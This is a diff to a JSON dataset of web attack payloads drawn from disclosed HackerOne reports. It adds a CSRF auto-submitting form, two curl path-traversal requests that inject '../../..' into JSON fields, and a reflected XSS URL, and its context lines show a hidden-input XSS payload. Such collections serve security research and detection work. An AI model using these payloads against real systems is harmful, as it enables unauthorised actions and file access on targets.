@@ -24565,6 +24565,57 @@
     }
   },
   {
+    "id": "375dd962",
+    "class": "csrf",
+    "payload": "<html>\n  <body>\n    <form action=\"\u2588\u2588\u2588\u2588\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>",
+    "technique": "Cross-Site Request Forgery using an auto\u2011submitting HTML form",
+    "param": null,
+    "report": {
+      "id": 2029753,
+      "url": "https://hackerone.com/reports/2029753",
+      "title": "CSRF to delete a pet",
+      "program": "Mars",
+      "reporter": "d0rift",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-08-30"
+    }
+  },
+  {
+    "id": "82f8fd8f",
+    "class": "path-traversal",
+    "payload": "curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{\"version\":\"v1\", \"trained_at\": \"2023-01-01T00:00:00Z/../../..\", \"input\": [{\"title\": \"test xss\", \"num_of_top_predictions\": 3}]}'",
+    "technique": "Directory traversal via '../../..' in the JSON field \"trained_at\"",
+    "param": "trained_at",
+    "report": {
+      "id": 2032778,
+      "url": "https://hackerone.com/reports/2032778",
+      "title": "Internal machine learning API endpoint for CWE classification is vulnerable to path traversal",
+      "program": "HackerOne",
+      "reporter": "jobert",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-07-05"
+    }
+  },
+  {
+    "id": "6873d130",
+    "class": "path-traversal",
+    "payload": "curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{\"version\":\"v1/../../../..\", \"trained_at\": \"2023-01-01T00:00:00Z\", \"input\": [{\"title\": \"test xss\", \"num_of_top_predictions\": 3}]}'",
+    "technique": "Directory traversal via '../../..' in the JSON field \"version\"",
+    "param": "version",
+    "report": {
+      "id": 2032778,
+      "url": "https://hackerone.com/reports/2032778",
+      "title": "Internal machine learning API endpoint for CWE classification is vulnerable to path traversal",
+      "program": "HackerOne",
+      "reporter": "jobert",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-07-05"
+    }
+  },
+  {
     "id": "85a681cd",
     "class": "xss",
     "payload": "<input type=\"hidden\" name=\"apellido\" value=\"<script>alert()</script>\" />",
@@ -24579,6 +24630,23 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2023-08-30"
+    }
+  },
+  {
+    "id": "113bdbfb",
+    "class": "xss",
+    "payload": "https://target.com/nin/success?message=lol&nin=<script",
+    "technique": "Reflected XSS by injecting <script> into the \"nin\" query parameter",
+    "param": "nin",
+    "report": {
+      "id": 2039384,
+      "url": "https://hackerone.com/reports/2039384",
+      "title": "Reflected XSS in https://target.com/nin/success?message=lol&nin=<VULNERABLE>",
+      "program": "MTN Group",
+      "reporter": "hazemhussien99",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2024-10-05"
     }
   },
   {
